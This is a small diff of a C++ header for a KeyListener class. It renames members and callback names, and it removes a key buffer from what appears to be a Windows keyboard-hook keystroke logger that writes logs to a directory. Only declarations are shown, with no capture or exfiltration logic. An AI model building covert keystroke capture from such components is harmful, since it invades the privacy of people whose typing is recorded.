@@ -10,7 +10,7 @@
 
 class KeyListener {
     public:
-        KeyListener(string &sKLogPath);
+        KeyListener(string &dir_to_save_logs);
         ~KeyListener();
         void fnPressCallback (
 		    int nCode,
@@ -19,12 +19,11 @@ class KeyListener {
 		);
 
     private:
-        Logger m_KeyLogger;
-        Logger m_DebugLogger;
-        BYTE m_baKeysPressed[LOGGER_MAX_MULTI_KEYS];
+        Logger key_logger;
+        Logger debug_logger;
 };
 
-static LRESULT CALLBACK fnKeyListenerPressCallbackProc (
+static LRESULT CALLBACK key_listener_press_callback_procedure (
     int nCode,
     WPARAM wParam,
     LPARAM lParam
